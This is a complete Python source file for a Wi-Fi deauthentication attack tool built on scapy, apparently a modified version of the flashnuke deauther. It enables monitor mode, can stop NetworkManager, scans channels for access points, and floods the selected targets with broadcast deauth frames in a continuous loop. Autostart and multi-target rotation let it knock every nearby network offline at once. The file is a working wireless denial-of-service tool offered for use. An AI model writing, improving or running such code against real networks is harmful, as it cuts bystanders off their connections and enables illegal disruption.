#!/usr/bin/env python3

import os
import sys  # leave it
import signal
import logging
import argparse
import threading  # leave it

from typing import Dict, Generator, List, Union

from scapy.layers.dot11 import RadioTap, Dot11Elt, Dot11Beacon, Dot11ProbeResp, Dot11Deauth, Dot11

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings

from scapy.all import *
from time import sleep

try:
    from .utils import *
except ImportError:
    from utils import *

conf.verb = 0


#   --------------------------------------------------------------------------------------------------------------------
#   ....................................................................................................................
#   .....................__      __ __  _____ __         _________                          __   __ ....................
#   ..................../  \    /  \__|/ ____\__|        \    __  \   ____  _____    __ ___/  |_|  |__..................
#   ....................\   \/\/   /  \   __\|  |  ______ |  |  \  \/ ___ \ \  __ \ |  |  \   __|  |  \.................
#   .....................\        /|  ||  |  |  | /_____/ |  |__/  /\  ___/ | |__\ \|  |  /|  | |   Y  \................
#   ......................\__/\__/ |__||__|  |__|         |_______/  \_____/_______/ ____/ |__| |___|__/................
#   ....................................................................................................................
#   Ⓒ by https://github.com/flashnuke Ⓒ................................................................................
#   --------------------------------------------------------------------------------------------------------------------


class Interceptor:
    _ABORT = False
    _PRINT_STATS_INTV = 1
    _DEAUTH_INTV = 0.100  # 100[ms]
    _DEAUTH_BURST = 5  # consecutive broadcast deauths per AP per loop
    _CH_SNIFF_TO = 4  # per-channel dwell time during scan, longer = weak APs get more beacon chances
    _SSID_STR_PAD = 42  # total len 80

    def __init__(self, net_iface, skip_monitor_mode_setup, kill_networkmanager,
                 ssid_name, bssid_addr, custom_channels, targets_file,
                 deauth_all_channels, autostart, debug_mode):
        self.interface = net_iface

        self._max_consecutive_failed_send_lim = 5 / Interceptor._DEAUTH_INTV  # fails to send for 5 consecutive seconds

        self._current_channel_num = None
        self._current_channel_aps = set()

        self.attack_loop_count = 0

        self._target_ssids: List[SSID] = list()
        self._l2_sock = None  # reused socket, avoids per-packet socket setup of sendp()
        self._debug_mode = debug_mode

        if not skip_monitor_mode_setup:
            print_info(f"Setting up monitor mode...")
            if not self._enable_monitor_mode():
                print_error(f"Monitor mode was not enabled properly")
                raise Exception("Unable to turn on monitor mode")
            print_info(f"Monitor mode was set up successfully")
        else:
            print_info(f"Skipping monitor mode setup...")

        if kill_networkmanager:
            print_info(f"Killing NetworkManager...")
            if not self._kill_networkmanager():
                print_error(f"Failed to kill NetworkManager...")

        self._channel_range = {channel: defaultdict(dict) for channel in self._get_channels()}
        self.log_debug(f"Supported channels: {[c for c in self._channel_range.keys()]}")
        self._all_ssids: Dict[BandType, Dict[str, SSID]] = {band: dict() for band in BandType}
        self._custom_ssid_name: Union[str, None] = self.parse_custom_ssid_name(ssid_name)
        self.log_debug(f"Selected custom ssid name: {self._custom_ssid_name}")
        self._custom_bssid_addr: Union[str, None] = self.parse_custom_bssid_addr(bssid_addr)
        self.log_debug(f"Selected custom bssid addr: {self._custom_bssid_addr}")
        self._custom_target_ap_channels: List[int] = self.parse_custom_channels(custom_channels)
        self.log_debug(f"Selected target channels: {self._custom_target_ap_channels}")

        self._custom_target_ap_last_ch = 0  # to avoid overlapping

        # manually supplied targets (MAC + channel) from a local file
        self._manual_targets: List[SSID] = self._load_manual_targets(targets_file)

        self._deauth_all_channels = deauth_all_channels

        self._ch_iterator: Union[Generator[int, None, int], None] = None
        if self._deauth_all_channels:
            self._ch_iterator = self._init_channels_generator()
        print_info(f"De-auth all channels enabled -> {BOLD}{self._deauth_all_channels}{RESET}")

        self._autostart = autostart

    @staticmethod
    def parse_custom_ssid_name(ssid_name: Union[None, str]) -> Union[None, str]:
        if ssid_name is not None:
            ssid_name = str(ssid_name)
            if len(ssid_name) == 0:
                print_error(f"Custom SSID name cannot be an empty string")
                raise Exception("Invalid SSID name")
        return ssid_name

    @staticmethod
    def parse_custom_bssid_addr(bssid_addr: Union[None, str]) -> Union[None, str]:
        if bssid_addr is not None:
            try:
                bssid_addr = Interceptor.verify_mac_addr(bssid_addr)
            except Exception as exc:
                print_error(f"Invalid bssid address -> {bssid_addr}")
                raise Exception("Bad custom BSSID mac address")
        return bssid_addr

    @staticmethod
    def verify_mac_addr(mac_addr: str) -> str:
        RandMAC(mac_addr)
        return mac_addr

    def parse_custom_channels(self, channel_list: Union[None, str]):
        ch_list = list()
        if channel_list is not None:
            try:
                ch_list = [int(ch) for ch in channel_list.split(',')]
            except Exception as exc:
                print_error(f"Invalid custom channel input -> {channel_list}")
                raise Exception("Bad custom channel input")

            if len(ch_list):
                supported_channels = self._channel_range.keys()
                for ch in ch_list:
                    if ch not in supported_channels:
                        print_error(f"Custom channel {ch} is not supported by the network interface"
                                    f" {list(supported_channels)}")
                        raise Exception("Unsupported channel")
        return ch_list

    def _load_manual_targets(self, targets_file: Union[None, str]) -> List[SSID]:
        """
        Load manually written targets from a local file, one per line: <MAC> <channel>
        ('#' comments and blank lines are ignored). Used for APs that are too weak
        to show up in the scan but whose MAC/channel are known.
        """
        if targets_file is None:
            return list()
        targets = list()
        try:
            with open(targets_file, 'r') as f:
                lines = f.readlines()
        except OSError as exc:
            print_error(f"Cannot read targets file -> {targets_file} ({exc})")
            raise Exception("Bad targets file")

        for line_num, line in enumerate(lines, start=1):
            line = line.split('#', 1)[0].strip()  # strip comments
            if not line:
                continue
            parts = line.replace(',', ' ').split()
            if len(parts) != 2:
                print_error(f"Targets file line {line_num}: expected '<MAC> <channel>', got -> {line}")
                raise Exception("Bad targets file entry")
            mac_addr, ch_str = parts
            try:
                mac_addr = Interceptor.verify_mac_addr(mac_addr)
                ch_num = int(ch_str)
            except Exception:
                print_error(f"Targets file line {line_num}: invalid MAC or channel -> {line}")
                raise Exception("Bad targets file entry")
            if ch_num not in self._channel_range:
                # channel is unsupported by the interface (e.g. 5GHz ch157 on a 2.4GHz-only adapter),
                # attacking it would be impossible anyway - fail early with a clear message
                print_error(f"Targets file line {line_num}: channel {ch_num} is not supported by the "
                            f"network interface, supported channels -> {list(self._channel_range.keys())}")
                raise Exception("Unsupported channel in targets file")
            band_type = BandType.T_50GHZ if ch_num > 14 else BandType.T_24GHZ
            targets.append(SSID(f"manual:{mac_addr}", mac_addr, band_type))
            targets[-1].add_channel(ch_num)

        if targets:
            print_info(f"Loaded {BOLD}{len(targets)}{RESET} manual target(s) from {BOLD}{targets_file}{RESET}")
        else:
            print_error(f"Targets file {targets_file} contains no valid entries")
            raise Exception("Empty targets file")
        return targets

    def _enable_monitor_mode(self):
        for cmd in [f"sudo ip link set {self.interface} down",
                    f"sudo iw {self.interface} set monitor control",
                    f"sudo ip link set {self.interface} up"]:
            print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
            if os.system(cmd):
                os.system(f"sudo ip link set {self.interface} up")  # re-enable iface if needed
                return False

        # run these cmds regardless of debug mode
        sleep(2)  # give the interface some time to set up
        iface_enabled = os.system(f"sudo ip link show {self.interface} | grep 'state DOWN' > /dev/null 2>&1")
        mm_enabled = os.system(f"sudo iw {self.interface} info | grep 'type monitor' > /dev/null 2>&1")
        self.log_debug(f"Interface is enabled -> {iface_enabled != 0}")
        self.log_debug(f"Monitor mode is enabled -> {mm_enabled == 0}")

        return True

    @staticmethod
    def _kill_networkmanager():
        cmd = 'systemctl stop NetworkManager'
        print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
        return not os.system(cmd)

    def _set_channel(self, ch_num) -> bool:
        if os.system(f"iw dev {self.interface} set channel {ch_num} 2>/dev/null") != 0:
            return False  # radio stays on its previous channel (e.g. ch14 restricted by regulatory domain)
        self._current_channel_num = ch_num
        return True

    def _get_channels(self) -> List[int]:
        return [int(channel.split('Channel')[1].split(':')[0].strip())
                for channel in os.popen(f'iwlist {self.interface} channel').readlines()
                if 'Channel' in channel and 'Current' not in channel]

    def _get_channel_range(self) -> List[int]:
        return self._custom_target_ap_channels or list(self._channel_range.keys())

    @staticmethod
    def _get_beacon_declared_channel(pkt) -> Union[int, None]:
        """Channel number from the frame's own DS Parameter Set element (ID=3)."""
        elt = pkt[Dot11Elt]
        while elt and isinstance(elt, Dot11Elt):
            if elt.ID == 3 and len(elt.info) >= 1:
                return elt.info[0]  # first byte = channel number
            elt = elt.payload
        return None

    def _ap_sniff_cb(self, pkt):
        try:
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                ap_mac = str(pkt.addr3)
                ssid = pkt[Dot11Elt].info.strip(b'\x00').decode('utf-8').strip() or ap_mac
                if ap_mac == BD_MACADDR or not ssid or (self._custom_ssid_name_is_set()
                                                        and self._custom_ssid_name.lower() not in ssid.lower()):
                    return
                elif self._custom_bssid_addr_is_set() and ap_mac.lower() != self._custom_bssid_addr.lower():
                    return
                # prefer the channel declared in the beacon's DS Parameter Set (ID=3):
                # the radiotap frequency only reflects what OUR radio was tuned to,
                # so adjacent-channel beacons get misattributed with it
                pkt_ch = self._get_beacon_declared_channel(pkt)
                if pkt_ch not in self._channel_range:
                    pkt_ch = frequency_to_channel(pkt[RadioTap].Channel)
                band_type = BandType.T_50GHZ if pkt_ch > 14 else BandType.T_24GHZ
                # key by BSSID so that multiple APs sharing the same SSID name are all kept
                if ap_mac not in self._all_ssids[band_type]:
                    self._all_ssids[band_type][ap_mac] = SSID(ssid, ap_mac, band_type)
                self._all_ssids[band_type][ap_mac].add_channel(pkt_ch if pkt_ch in self._channel_range else self._current_channel_num)
                if self._custom_ssid_name_is_set():
                    self._custom_target_ap_last_ch = self._all_ssids[band_type][ap_mac].channel
        except Exception as exc:
            pass

    def _scan_channels_for_aps(self):
        channels_to_scan = self._get_channel_range()
        print_info(f"Starting AP scan, please wait... ({len(channels_to_scan)} channels total)")
        if self._custom_ssid_name_is_set():
            print_info(f"Scanning for target SSID -> {BOLD}{self._custom_ssid_name}{RESET}")
        try:
            for idx, ch_num in enumerate(channels_to_scan):
                if self._custom_ssid_name_is_set() and self._found_custom_ssid_name() \
                        and self._current_channel_num - self._custom_target_ap_last_ch > 2:
                    # make sure sniffing doesn't stop on an overlapped channel for custom SSIDs
                    return
                if not self._set_channel(ch_num):
                    print_info(f"Channel {BOLD}{ch_num}{RESET} is not available on this interface, skipping...")
                    continue
                print_info(f"Scanning channel {BOLD}{self._current_channel_num}{RESET}, remaining -> "
                           f"{len(channels_to_scan) - (idx + 1)} ", end="\r")
                sniff(prn=self._ap_sniff_cb, iface=self.interface, timeout=Interceptor._CH_SNIFF_TO,
                      stop_filter=lambda p: Interceptor._ABORT is True)
        finally:
            printf("")

    def _found_custom_ssid_name(self):
        for all_channel_aps in self._all_ssids.values():
            for ssid_obj in all_channel_aps.values():
                if ssid_obj.name == self._custom_ssid_name:
                    return True
        return False

    def _custom_ssid_name_is_set(self):
        return self._custom_ssid_name is not None

    def _custom_bssid_addr_is_set(self):
        return self._custom_bssid_addr is not None

    def _start_initial_ap_scan(self) -> List[SSID]:
        self._scan_channels_for_aps()
        for band_ssids in self._all_ssids.values():
            for ssid_obj in band_ssids.values():
                self._channel_range[ssid_obj.channel][ssid_obj.mac_addr] = copy.deepcopy(ssid_obj)

        # manual targets from the targets file take part in selection as well,
        # they may overlap with scanned ones (dedup by MAC happens after selection)
        for ssid_obj in self._manual_targets:
            self._channel_range.setdefault(ssid_obj.channel, dict())[ssid_obj.mac_addr] = copy.deepcopy(ssid_obj)

        pref = '[   ] '
        printf(f"{DELIM}\n"
               f"{pref}{self._generate_ssid_str('SSID Name', 'Channel', 'MAC Address', len(pref))}")

        ctr = 0
        target_map: Dict[int, SSID] = dict()
        for channel, all_channel_aps in sorted(self._channel_range.items()):
            for ssid_obj in all_channel_aps.values():
                ctr += 1
                target_map[ctr] = copy.deepcopy(ssid_obj)
                pref = f"[{str(ctr).rjust(3, ' ')}] "
                preflen = len(pref)
                pref = f"[{BOLD}{YELLOW}{str(ctr).rjust(3, ' ')}{RESET}] "
                printf(f"{pref}{self._generate_ssid_str(ssid_obj.name, ssid_obj.channel, ssid_obj.mac_addr, preflen)}")
        if not target_map:
            if self._manual_targets:
                print_info(f"No APs were found by scanning, "
                           f"but {len(self._manual_targets)} manual target(s) were loaded from the targets file")
                return list(self._manual_targets)
            Interceptor.abort_run("Not APs were found, quitting...")

        printf(DELIM)

        chosen: Union[List[int], None] = None
        if self._autostart:
            chosen = list(target_map.keys())
            print_info(f"Autostart was set to True, attacking all {len(chosen)} target(s) in rotation")

        # won't enter loop if autostart was set
        while chosen is None:
            user_input = print_input(f"Choose targets from {min(target_map.keys())} to {max(target_map.keys())} "
                                     f"(i.e -> 1,3,5 or 'all'):")
            chosen = self._parse_targets_input(user_input, target_map)

        return [target_map[idx] for idx in chosen]

    @staticmethod
    def _parse_targets_input(user_input: str, target_map: Dict[int, SSID]) -> Union[List[int], None]:
        user_input = user_input.strip()
        if user_input.lower() == 'all':
            return list(target_map.keys())
        try:
            indices = sorted({int(tok) for tok in user_input.replace(' ', ',').split(',') if tok})
        except ValueError:
            print_error("Wrong input! please enter integers separated by commas (i.e -> 1,3,5) or 'all'")
            return None
        if not indices:
            print_error("Empty selection, please choose at least one target")
            return None
        invalid = [idx for idx in indices if idx not in target_map]
        if invalid:
            print_error(f"Invalid target number(s) -> {invalid}, "
                        f"choose from {min(target_map.keys())} to {max(target_map.keys())}")
            return None
        return indices

    def _generate_ssid_str(self, ssid, ch, mcaddr, preflen):
        return f"{ssid.ljust(Interceptor._SSID_STR_PAD - preflen, ' ')}{str(ch).ljust(3, ' ').ljust(Interceptor._SSID_STR_PAD // 2, ' ')}{mcaddr}"

    def _get_l2_socket(self):
        if self._l2_sock is None:
            self._l2_sock = conf.L2socket(iface=self.interface)
        return self._l2_sock

    def _run_deauther(self):
        try:
            print_info(f"Starting de-auth loop...")

            failed_attempts_ctr = 0
            while not Interceptor._ABORT:
                try:
                    if self._deauth_all_channels:
                        self._iter_next_channel()
                    self.attack_loop_count += 1
                    for ssid in self._target_ssids:
                        # hop to the target's channel before attacking it (unless channel iteration is on)
                        if not self._deauth_all_channels and self._current_channel_num != ssid.channel:
                            self._set_channel(ssid.channel)
                        # broadcast-only deauth burst, keeps per-AP packet density when rotating multiple targets
                        self._send_deauth_broadcast(ssid.mac_addr, burst=Interceptor._DEAUTH_BURST)
                    failed_attempts_ctr = 0  # reset counter
                except Exception as exc:
                    failed_attempts_ctr += 1
                    if failed_attempts_ctr >= self._max_consecutive_failed_send_lim:
                        raise exc
                    sleep(Interceptor._DEAUTH_INTV)  # if exception - sleep to throttle down
        except Exception as exc:
            Interceptor.abort_run(f"Exception '{exc}' in deauth-loop -> {traceback.format_exc()}")
        finally:
            if self._l2_sock is not None:
                try:
                    self._l2_sock.close()
                except Exception:
                    pass
                self._l2_sock = None

    def _send_deauth_broadcast(self, ap_mac: str, burst: int = 1):
        sock = self._get_l2_socket()
        pkt = RadioTap() / Dot11(addr1=BD_MACADDR, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
        for _ in range(burst):
            sock.send(pkt)

    def run(self):
        self._target_ssids = self._start_initial_ap_scan()
        # sort targets by channel so same-channel APs are attacked back-to-back (minimal channel hops)
        self._target_ssids.sort(key=lambda ssid: ssid.channel)
        print_info(f"Attacking {len(self._target_ssids)} target(s) in rotation:")
        for ssid in self._target_ssids:
            print_info(f"  -> {BOLD}{ssid.name}{RESET} ({ssid.mac_addr}) on channel {ssid.channel}")
        first_ch = self._target_ssids[0].channel
        print_info(f"Setting channel -> {first_ch}")
        self._set_channel(first_ch)

        printf(f"{DELIM}\n")

        threads = list()
        for action in [self._run_deauther, self.report_status]:
            t = Thread(target=action, args=tuple())
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

    def report_status(self):
        start = get_time()
        printf(f"{DELIM}\n")

        while not Interceptor._ABORT:
            lines_printed = 0
            if len(self._target_ssids) == 1:
                ssid = self._target_ssids[0]
                print_info(f"Target SSID{ssid.name.rjust(80 - 15, ' ')}")
                print_info(f"Channel{str(self._current_channel_num).rjust(80 - 11, ' ')}")
                print_info(f"MAC addr{ssid.mac_addr.rjust(80 - 12, ' ')}")
                lines_printed += 3
            else:
                print_info(f"Targets ({len(self._target_ssids)}) in rotation")
                lines_printed += 1
                for ssid in self._target_ssids:
                    print_info(f"  {ssid.name.ljust(Interceptor._SSID_STR_PAD - 8, ' ')}"
                               f"{str(ssid.channel).ljust(5, ' ')}{ssid.mac_addr}")
                    lines_printed += 1
            print_info(f"Net interface{self.interface.rjust(80 - 17, ' ')}")
            print_info(f"Elapsed sec {BOLD}{str(get_time() - start).rjust(80 - 16, ' ')}{RESET}")
            lines_printed += 2
            sleep(Interceptor._PRINT_STATS_INTV)
            if Interceptor._ABORT:  # might change while sleeping
                break
            clear_line(lines_printed + 1)

    def log_debug(self, msg: str):
        if self._debug_mode:
            print_debug(msg)

    @staticmethod
    def user_abort(*_):
        Interceptor.abort_run(f"User asked to stop, quitting...")

    @staticmethod
    def abort_run(msg: str):
        if not Interceptor._ABORT:  # thread-safe due to GIL
            Interceptor._ABORT = True
            sleep(Interceptor._PRINT_STATS_INTV * 1.1)  # let prints finish
            printf(f"{DELIM}")
            print_error(msg)
            exit(0)

    def _iter_next_channel(self):
        self._set_channel(next(self._ch_iterator))

    def _init_channels_generator(self) -> Generator[int, None, int]:
        ch_range = self._get_channel_range()
        ctr = 0
        while not Interceptor._ABORT:
            yield ch_range[ctr]
            ctr = (ctr + 1) % len(ch_range)
        return ctr


def main():
    signal.signal(signal.SIGINT, Interceptor.user_abort)

    printf(f"\n{BANNER}\n"
           f"Make sure of the following:\n"
           f"1. You are running as {BOLD}root{RESET}\n"
           f"2. You kill NetworkManager (manually or by passing {BOLD}--kill{RESET})\n"
           f"3. Your wireless adapter supports {BOLD}monitor mode{RESET} (refer to docs)\n\n"
           f"Written by {BOLD}@flashnuke{RESET}")
    printf(DELIM)
    restore_print()

    if "linux" not in sys.platform:
        raise OSError(f"Unsupported operating system {sys.platform}, only linux is supported...")
    elif os.geteuid() != 0:
        raise PermissionError(f"Must be run as root")

    parser = argparse.ArgumentParser(description='A simple program to perform a deauth attack')
    parser.add_argument('-i', '--iface', help='a network interface with monitor mode enabled (i.e -> "eth0")',
                        action='store', dest="net_iface", metavar="network_interface", required=True)
    parser.add_argument('--skip-monitormode', help='skip automatic setup of monitor mode', action='store_true',
                        default=False, dest="skip_monitormode", required=False)
    parser.add_argument('-k', '--kill', help='kill NetworkManager (might interfere with the process)',
                        action='store_true', default=False, dest="kill_networkmanager", required=False)
    parser.add_argument('-s', '--ssid', help='custom SSID name (case-insensitive)', metavar="ssid_name",
                        action='store', default=None, dest="custom_ssid", required=False)
    parser.add_argument('-b', '--bssid', help='custom BSSID address (case-insensitive)', metavar="bssid_addr",
                        action='store', default=None, dest="custom_bssid", required=False)
    parser.add_argument('-c', '--channels',
                        help='custom channels to scan / de-auth, separated by a comma (i.e -> 1,3,4)',
                        metavar="ch1,ch2", action='store', default=None, dest="custom_channels", required=False)
    parser.add_argument('-t', '--targets-file',
                        help='file with manually known targets, one "<MAC> <channel>" per line'
                             ' (i.e -> 0c:4b:54:e2:9d:1f 1), added to the attack rotation',
                        metavar="targets_file", action='store', default=None, dest="targets_file", required=False)
    parser.add_argument('-a', '--autostart',
                        help='autostart the de-auth loop (attacks the single found AP, or all found APs in rotation)',
                        action='store_true', default=False, dest="autostart", required=False)
    parser.add_argument('-d', '--debug', help='enable debug prints',
                        action='store_true', default=False, dest="debug_mode", required=False)
    parser.add_argument('--deauth-all-channels', help='enable de-auther on all channels',
                        action='store_true', default=False, dest="deauth_all_channels", required=False)
    pargs = parser.parse_args()

    invalidate_print()  # after arg parsing
    attacker = Interceptor(net_iface=pargs.net_iface,
                           skip_monitor_mode_setup=pargs.skip_monitormode,
                           kill_networkmanager=pargs.kill_networkmanager,
                           ssid_name=pargs.custom_ssid,
                           bssid_addr=pargs.custom_bssid,
                           custom_channels=pargs.custom_channels,
                           targets_file=pargs.targets_file,
                           deauth_all_channels=pargs.deauth_all_channels,
                           autostart=pargs.autostart,
                           debug_mode=pargs.debug_mode)
    attacker.run()


if __name__ == "__main__":
    main()
